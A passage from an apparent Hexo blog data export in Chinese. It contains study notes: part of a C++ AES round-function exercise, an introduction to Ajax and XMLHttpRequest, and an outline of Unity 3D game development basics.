class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;iostream&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;cstdio&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;cstring&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;algorithm&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;bitset&gt;</span></span><br><span class=\"hljs-keyword\">using</span> <span class=\"hljs-keyword\">namespace</span> std;<br> <br><span class=\"hljs-type\">int</span> a[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>] = &#123;<br>    &#123;<span class=\"hljs-number\">0x87</span>, <span class=\"hljs-number\">0xF2</span>, <span class=\"hljs-number\">0x4D</span>, <span class=\"hljs-number\">0x97</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0xEC</span>, <span class=\"hljs-number\">0x6E</span>, <span class=\"hljs-number\">0x4C</span>, <span class=\"hljs-number\">0x90</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x4A</span>, <span class=\"hljs-number\">0xC3</span>, <span class=\"hljs-number\">0x46</span>, <span class=\"hljs-number\">0xE7</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x8C</span>, <span class=\"hljs-number\">0xD8</span>, <span class=\"hljs-number\">0x95</span>, <span class=\"hljs-number\">0xA6</span>&#125;<br>&#125;;<span class=\"hljs-comment\">//字节代换后的矩阵</span><br><span class=\"hljs-type\">int</span> mixCol[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>] = &#123;<br>    &#123;<span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x01</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x01</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>&#125;<br>&#125;;<span class=\"hljs-comment\">//列混淆矩阵</span><br><span class=\"hljs-type\">int</span> round_key[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>] = &#123;<br>    &#123;<span class=\"hljs-number\">0xAC</span>, <span class=\"hljs-number\">0x19</span>, <span class=\"hljs-number\">0x28</span>, <span class=\"hljs-number\">0x57</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x77</span>, <span class=\"hljs-number\">0xFA</span>, <span class=\"hljs-number\">0xD1</span>, <span class=\"hljs-number\">0x5C</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0x66</span>, <span class=\"hljs-number\">0xDC</span>, <span class=\"hljs-number\">0x29</span>, <span class=\"hljs-number\">0x00</span>&#125;,<br>    &#123;<span class=\"hljs-number\">0xF3</span>, <span class=\"hljs-number\">0x21</span>, <span class=\"hljs-number\">0x41</span>, <span class=\"hljs-number\">0x6A</span>&#125;,<br>&#125;;<span class=\"hljs-comment\">//轮密钥矩阵</span><br> <br><span class=\"hljs-type\">int</span> b[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>];<span class=\"hljs-comment\">//行移位后的矩阵</span><br><span class=\"hljs-type\">int</span> resMix[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>];<span class=\"hljs-comment\">//列混淆后的矩阵</span><br><span class=\"hljs-type\">int</span> res[<span class=\"hljs-number\">4</span>][<span class=\"hljs-number\">4</span>];<span class=\"hljs-comment\">//轮密钥加后的矩阵</span><br> <br><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">mul_mat</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> x,<span class=\"hljs-type\">int</span> y)</span> </span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(x == <span class=\"hljs-number\">0x01</span>) &#123;<br>        <span class=\"hljs-keyword\">return</span> y;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(x == <span class=\"hljs-number\">0x02</span>) &#123;<br>        <span class=\"hljs-keyword\">if</span>((y&amp;<span class=\"hljs-number\">128</span>) != <span class=\"hljs-number\">128</span>) &#123; <span class=\"hljs-comment\">//二进制首位为0</span><br>            <span class=\"hljs-keyword\">return</span> y&lt;&lt;<span class=\"hljs-number\">1</span>;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-type\">int</span> temp = ((y&lt;&lt;<span class=\"hljs-number\">1</span>)&amp;((<span class=\"hljs-number\">1</span>&lt;&lt;<span class=\"hljs-number\">8</span>)<span class=\"hljs-number\">-1</span>)); <span class=\"hljs-comment\">//向左移一位，删掉最高位(保留8位)</span><br>            <span class=\"hljs-keyword\">return</span> temp^(<span class=\"hljs-number\">0x1b</span>);<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(x == <span class=\"hljs-number\">0x03</span>) &#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">mul_mat</span>(<span class=\"hljs-number\">0x02</span>,y)^y;<br>    &#125;<br>&#125;<br> <br> <br><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span> </span>&#123;<br> <br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;字节代换后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;a[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class=\"hljs-comment\">//行移位</span><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++)<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++)<br>            b[i][j] = a[i][(i+j)%<span class=\"hljs-number\">4</span>];<br> <br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;行移位后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;b[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class=\"hljs-comment\">//列混淆</span><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> k=<span class=\"hljs-number\">0</span>;k&lt;=<span class=\"hljs-number\">3</span>;k++) &#123;<br>                resMix[i][j] ^= <span class=\"hljs-built_in\">mul_mat</span>(mixCol[i][k],b[k][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;列混淆后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;resMix[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class=\"hljs-comment\">//轮密钥加</span><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            res[j][i] = resMix[j][i] ^ round_key[j][i];<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;<span class=\"hljs-string\">&quot;轮密钥加后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">3</span>;i++) &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">0</span>;j&lt;=<span class=\"hljs-number\">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;res[i][j]&lt;&lt;<span class=\"hljs-string\">&#x27;\\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n"},{"title":"Ajax","date":"2021-04-12T15:41:10.000Z","mp3":null,"cover":"img/bg1.jpg","_content":"\n# AJAX\n\n```\nAsynchronous Javascript and XML;(异步的javascript和XML)。\n```\n\n✨无须更新整个网页的情况下，更新部分网页；\n\n传统的网页，需要更新或者提交一个表单，都需要重新加载整个网页；\n\n增强了B/S（浏览器/服务器）的体验性；\n\n高可用，更丰富，更动态；\n\n#### Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\n\n```js\nvariable=new XMLHttpRequest();\n```\n\n1.发送请求open和send方法\n\n```javascript\nxmlhttp.open(\"GET\",\"test1.txt\",true);\nxmlhttp.send();\n```\n\n| 方法                       | 描述                                                         |\n| -------------------------- | ------------------------------------------------------------ |\n| open（method，url，async） | method：GET POST；url:文件在服务器的位置；async：true同步，false异步； |\n| send（string）             | 将请求发送到服务器：string：仅适用于POST                     |\n\n2.GET 还是 POST？\n\n与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。\n\n然而，在以下情况中，请使用 POST 请求：\n\n- 无法使用缓存文件（更新服务器上的文件或数据库）\n- 向服务器发送大量数据（POST 没有数据量限制）\n- 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠\n\n3.通过 AJAX，JavaScript 无需等待服务器的响应，而是：\n\n- 在等待服务器响应时执行其他脚本\n- 当响应就绪后对响应进行处理\n\n","source":"_posts/Ajax.md","raw":"---\ntitle: Ajax\ndate: 2021-04-12 23:41:10\ncategories: \n    - 前端\ntags: \n    - 面试\n    - 笔记\nmp3: \ncover: img/bg1.jpg\n---\n\n# AJAX\n\n```\nAsynchronous Javascript and XML;(异步的javascript和XML)。\n```\n\n✨无须更新整个网页的情况下，更新部分网页；\n\n传统的网页，需要更新或者提交一个表单，都需要重新加载整个网页；\n\n增强了B/S（浏览器/服务器）的体验性；\n\n高可用，更丰富，更动态；\n\n#### Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\n\n```js\nvariable=new XMLHttpRequest();\n```\n\n1.发送请求open和send方法\n\n```javascript\nxmlhttp.open(\"GET\",\"test1.txt\",true);\nxmlhttp.send();\n```\n\n| 方法                       | 描述                                                         |\n| -------------------------- | ------------------------------------------------------------ |\n| open（method，url，async） | method：GET POST；url:文件在服务器的位置；async：true同步，false异步； |\n| send（string）             | 将请求发送到服务器：string：仅适用于POST                     |\n\n2.GET 还是 POST？\n\n与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。\n\n然而，在以下情况中，请使用 POST 请求：\n\n- 无法使用缓存文件（更新服务器上的文件或数据库）\n- 向服务器发送大量数据（POST 没有数据量限制）\n- 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠\n\n3.通过 AJAX，JavaScript 无需等待服务器的响应，而是：\n\n- 在等待服务器响应时执行其他脚本\n- 当响应就绪后对响应进行处理\n\n","slug":"Ajax","published":1,"updated":"2021-07-22T05:37:04.000Z","_id":"clg29vyh0002xao9c9ijs2d25","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"AJAX\"><a href=\"#AJAX\" class=\"headerlink\" title=\"AJAX\"></a>AJAX</h1><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mipsasm\">Asynchronous <span class=\"hljs-keyword\">Javascript </span><span class=\"hljs-keyword\">and </span>XML<span class=\"hljs-comment\">;(异步的javascript和XML)。</span><br></code></pre></td></tr></table></figure>\n\n<p>✨无须更新整个网页的情况下，更新部分网页；</p>\n<p>传统的网页，需要更新或者提交一个表单，都需要重新加载整个网页；</p>\n<p>增强了B/S（浏览器/服务器）的体验性；</p>\n<p>高可用，更丰富，更动态；</p>\n<h4 id=\"Ajax的核心：XHR-XMLHttpRequest-能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\"><a href=\"#Ajax的核心：XHR-XMLHttpRequest-能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\" class=\"headerlink\" title=\"Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\"></a>Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">variable=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">XMLHttpRequest</span>();<br></code></pre></td></tr></table></figure>\n\n<p>1.发送请求open和send方法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">xmlhttp.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">&quot;GET&quot;</span>,<span class=\"hljs-string\">&quot;test1.txt&quot;</span>,<span class=\"hljs-literal\">true</span>);<br>xmlhttp.<span class=\"hljs-title function_\">send</span>();<br></code></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>open（method，url，async）</td>\n<td>method：GET POST；url:文件在服务器的位置；async：true同步，false异步；</td>\n</tr>\n<tr>\n<td>send（string）</td>\n<td>将请求发送到服务器：string：仅适用于POST</td>\n</tr>\n</tbody></table>\n<p>2.GET 还是 POST？</p>\n<p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。</p>\n<p>然而，在以下情况中，请使用 POST 请求：</p>\n<ul>\n<li>无法使用缓存文件（更新服务器上的文件或数据库）</li>\n<li>向服务器发送大量数据（POST 没有数据量限制）</li>\n<li>发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</li>\n</ul>\n<p>3.通过 AJAX，JavaScript 无需等待服务器的响应，而是：</p>\n<ul>\n<li>在等待服务器响应时执行其他脚本</li>\n<li>当响应就绪后对响应进行处理</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"AJAX\"><a href=\"#AJAX\" class=\"headerlink\" title=\"AJAX\"></a>AJAX</h1><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mipsasm\">Asynchronous <span class=\"hljs-keyword\">Javascript </span><span class=\"hljs-keyword\">and </span>XML<span class=\"hljs-comment\">;(异步的javascript和XML)。</span><br></code></pre></td></tr></table></figure>\n\n<p>✨无须更新整个网页的情况下，更新部分网页；</p>\n<p>传统的网页，需要更新或者提交一个表单，都需要重新加载整个网页；</p>\n<p>增强了B/S（浏览器/服务器）的体验性；</p>\n<p>高可用，更丰富，更动态；</p>\n<h4 id=\"Ajax的核心：XHR-XMLHttpRequest-能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\"><a href=\"#Ajax的核心：XHR-XMLHttpRequest-能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\" class=\"headerlink\" title=\"Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。\"></a>Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">variable=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">XMLHttpRequest</span>();<br></code></pre></td></tr></table></figure>\n\n<p>1.发送请求open和send方法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">xmlhttp.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">&quot;GET&quot;</span>,<span class=\"hljs-string\">&quot;test1.txt&quot;</span>,<span class=\"hljs-literal\">true</span>);<br>xmlhttp.<span class=\"hljs-title function_\">send</span>();<br></code></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>open（method，url，async）</td>\n<td>method：GET POST；url:文件在服务器的位置；async：true同步，false异步；</td>\n</tr>\n<tr>\n<td>send（string）</td>\n<td>将请求发送到服务器：string：仅适用于POST</td>\n</tr>\n</tbody></table>\n<p>2.GET 还是 POST？</p>\n<p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。</p>\n<p>然而，在以下情况中，请使用 POST 请求：</p>\n<ul>\n<li>无法使用缓存文件（更新服务器上的文件或数据库）</li>\n<li>向服务器发送大量数据（POST 没有数据量限制）</li>\n<li>发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</li>\n</ul>\n<p>3.通过 AJAX，JavaScript 无需等待服务器的响应，而是：</p>\n<ul>\n<li>在等待服务器响应时执行其他脚本</li>\n<li>当响应就绪后对响应进行处理</li>\n</ul>\n"},{"title":"3D游戏开发","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg16.jpg","_content":"\n\n\n# 3D游戏开发\n\n## 一、3D实体搭建\n\n### 1.3D实体\n\n#### 位姿态\n\n- 位置：Position（x,y,z）\n- 旋转：Rotation（x,y,z)\n- 缩放：Scale（x,y,z)\n\n> Unity中，绝大部分情况下，是先缩放，后旋转，最后平移；\n\n#### 3D实体的创建\n\n- 通过加载3D模型创建，如fbx、gltf、obj\n- 通过组合参数化的基本集合体创建\n\n#### 实体绘制\n\n- 材质\n- 颜色\n- 纹理\n\n#### 预制体\n\n- 将游戏对象保存在工程中，在需要的时候创建出来，这就是预制体；\n- 预制体存储者一个游戏对象，包括游戏对象的所有组件以及其下的所有子游戏对象；\n\n## 二、相机、光照、天空盒\n\n### 1.相机\n\n- Clear Flag\n- 背景颜色\n- Culling Mask\n- 投影（透视、正交）\n\n透视是存在近大远小，正交是没有的；\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/4dc7ee72a6e9dfda.jpg)\n\n### 2.光照\n\n- 类型：点光源、平行光、聚光灯、面积光\n- 颜色\n- 强度\n- 阴影乐星\n\n### 3.天空盒\n\n- 相机的清除标志设为“天空盒”\n- 窗口-渲染-照明设置\n- 环境-天空盒材质\n\n## 三、控制和碰撞\n\n### 1.启动流程\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/e6cf1e6d09956c34.jpg)\n\n### 2.控制逻辑\n\n- 添加刚体组件（运动过程中不会发生形变的物体）\n\n```\n添加组件；\nUse Gravity设置为false\nisKinematic设置为true，飞船通过脚本而非力影响运动属性\n设置constraints，冻结z轴位移以及x、y、z轴旋转\n\n```\n\n- 添加自定义脚本\n\n```\nadd component > new script\n\nMonoBehavior是一个基类，所有Unity脚本都派生自该类；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/99791d98ab219a60.jpg)\n\n#### Input.GetAxis()和输入管理器InputManager\n\n> InputManager是Unity设置输入响应方式的管理列表，Edit > Project > Setting > Input\n\n- 添加敌机\n\n```\n需要使用另一个脚本；\n不受按键控制；\n```\n\n```\n随机生成敌机\n新建一个Main的C#脚本，绑定到Main camera(因为敌机伴随整个游戏周期，所以绑定到Camera)\n```\n\n### 3.碰撞逻辑\n\n#### 标签\n\n> Edit > Project >Tags and Layers 命令\n>\n> 不同Layers的实体不会发生碰撞；\n\n#### 物理管理器\n\n> Edit > Project Setting > Physics\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/5bba664ee9c8df56.jpg)\n\n#### 碰撞 \n\n> 3D中球体的体积碰撞只需要计算两个球体球心的距离和两个实体半径之和；\n\n## 四、玩法逻辑和UI\n\n### 1.添加新的刚体\n\n- 子弹\n- 升级道具\n\n### 2.添加玩法\n\n- 为每一个敌机设计分数\n- 添加计分板\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/5d64aadbdbbbbe32.jpg)\n\n##### 推荐课程\n\n- 现代计算机图形学入门-闫令其\n- 现代游戏引擎入门必修课-王希\n- 高质量试试渲染-闫\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/3D游戏实战.md","raw":"---\ntitle: 3D游戏开发\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 3D\n    - 笔记\nmp3: \ncover: img/bg16.jpg\n---\n\n\n\n# 3D游戏开发\n\n## 一、3D实体搭建\n\n### 1.3D实体\n\n#### 位姿态\n\n- 位置：Position（x,y,z）\n- 旋转：Rotation（x,y,z)\n- 缩放：Scale（x,y,z)\n\n> Unity中，绝大部分情况下，是先缩放，后旋转，最后平移；\n\n#### 3D实体的创建\n\n- 通过加载3D模型创建，如fbx、gltf、obj\n- 通过组合参数化的基本集合体创建\n\n#### 实体绘制\n\n- 材质\n- 颜色\n- 纹理\n\n#### 预制体\n\n- 将游戏对象保存在工程中，在需要的时候创建出来，这就是预制体；\n- 预制体存储者一个游戏对象，包括游戏对象的所有组件以及其下的所有子游戏对象；\n\n## 二、相机、光照、天空盒\n\n### 1.相机\n\n- Clear Flag\n- 背景颜色\n- Culling Mask\n- 投影（透视、正交）\n\n透视是存在近大远小，正交是没有的；\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/4dc7ee72a6e9dfda.jpg)\n\n### 2.光照\n\n- 类型：点光源、平行光、聚光灯、面积光\n- 颜色\n- 强度\n- 阴影乐星\n\n### 3.天空盒\n\n- 相机的清除标志设为“天空盒”\n- 窗口-渲染-照明设置\n- 环境-天空盒材质\n\n## 三、控制和碰撞\n\n### 1.启动流程\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/e6cf1e6d09956c34.jpg)\n\n### 2.控制逻辑\n\n- 添加刚体组件（运动过程中不会发生形变的物体）\n\n```\n添加组件；\nUse Gravity设置为false\nisKinematic设置为true，飞船通过脚本而非力影响运动属性\n设置constraints，冻结z轴位移以及x、y、z轴旋转\n\n```\n\n- 添加自定义脚本\n\n```\nadd component > new script\n\nMonoBehavior是一个基类，所有Unity脚本都派生自该类；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/99791d98ab219a60.jpg)\n\n#### Input.GetAxis()和输入管理器InputManager\n\n> InputManager是Unity设置输入响应方式的管理列表，Edit > Project > Setting > Input\n\n- 添加敌机\n\n```\n需要使用另一个脚本；\n不受按键控制；\n```\n\n```\n随机生成敌机\n新建一个Main的C#脚本，绑定到Main camera(因为敌机伴随整个游戏周期，所以绑定到Camera)\n```\n\n### 3.碰撞逻辑\n\n#### 标签\n\n> Edit > Project >Tags and Layers 命令\n>\n> 不同Layers的实体不会发生碰撞；\n\n#### 物理管理器\n\n> Edit > Project Setting > Physics\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/5bba664ee9c8df56.jpg)\n\n#### 碰撞 \n\n> 3D中球体的体积碰撞只需要计算两个球体球心的距离和两个实体半径之和；\n\n## 四、玩法逻辑和UI\n\n### 1.添加新的刚体\n\n- 子弹\n- 升级道具\n\n### 2.添加玩法\n\n- 为每一个敌机设计分数\n- 添加计分板\n\n![](https://s3.bmp.ovh/imgs/2023/02/15/5d64aadbdbbbbe32.jpg)\n\n##### 推荐课程\n\n- 现代计算机图形学入门-闫令其\n- 现代游戏引擎入门必修课-王希\n- 高质量试试渲染-闫\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"3D游戏实战","published":1,"updated":"2023-03-27T11:07:22.266Z","_id":"clg29vyh0002yao9cfg6c2zj7","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"3D游戏开发\"><a href=\"#3D游戏开发\" class=\"headerlink\" title=\"3D游戏开发\"></a>3D游戏开发</h1><h2 id=\"一、3D实体搭建\"><a href=\"#一、3D实体搭建\" class=\"headerlink\" title=\"一、3D实体搭建\"></a>一、3D实体搭建</h2><h3 id=\"1-3D实体\"><a href=\"#1-3D实体\" class=\"headerlink\" title=\"1.3D实体\"></a>1.3D实体</h3><h4 id=\"位姿态\"><a href=\"#位姿态\" class=\"headerlink\" title=\"位姿态\"></a>位姿态</h4><ul>\n<li>位置：Position（x,y,z）</li>\n<li>旋转：Rotation（x,y,z)</li>\n<li>缩放：Scale（x,y,z)</li>\n</ul>\n<blockquote>\n<p>Unity中，绝大部分情况下，是先缩放，后旋转，最后平移；</p>\n</blockquote>\n<h4 id=\"3D实体的创建\"><a href=\"#3D实体的创建\" class=\"headerlink\" title=\"3D实体的创建\"></a>3D实体的创建</h4><ul>\n<li>通过加载3D模型创建，如fbx、gltf、obj</li>\n<li>通过组合参数化的基本集合体创建</li>\n</ul>\n<h4 id=\"实体绘制\"><a href=\"#实体绘制\" class=\"headerlink\" title=\"实体绘制\"></a>实体绘制</h4><ul>\n<li>材质</li>\n<li>颜色</li>\n<li>纹理</li>\n</ul>\n<h4 id=\"预制体\"><a href=\"#预制体\" class=\"headerlink\" title=\"预制体\"></a>预制体</h4><ul>\n<li>将游戏对象保存在工程中，在需要的时候创建出来，这就是预制体；</li>\n<li>预制体存储者一个游戏对象，包括游戏对象的所有组件以及其下的所有子游戏对象；</li>\n</ul>\n<h2 id=\"二、相机、光照、天空盒\"><a href=\"#二、相机、光照、天空盒\" class=\"headerlink\" title=\"二、相机、光照、天空盒\"></a>二、相机、光照、天空盒</h2><h3 id=\"1-相机\"><a href=\"#1-相机\" class=\"headerlink\" title=\"1.相机\"></a>1.相机</h3><ul>\n<li>Clear Flag</li>\n<li>背景颜色</li>\n<li>Culling Mask</li>\n<li>投影（透视、正交）</li>\n</ul>\n<p>透视是存在近大远小，正交是没有的；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/15/4dc7ee72a6e9dfda.jpg\"></p>\n<h3 id=\"2-光照\"><a href=\"#2-光照\" 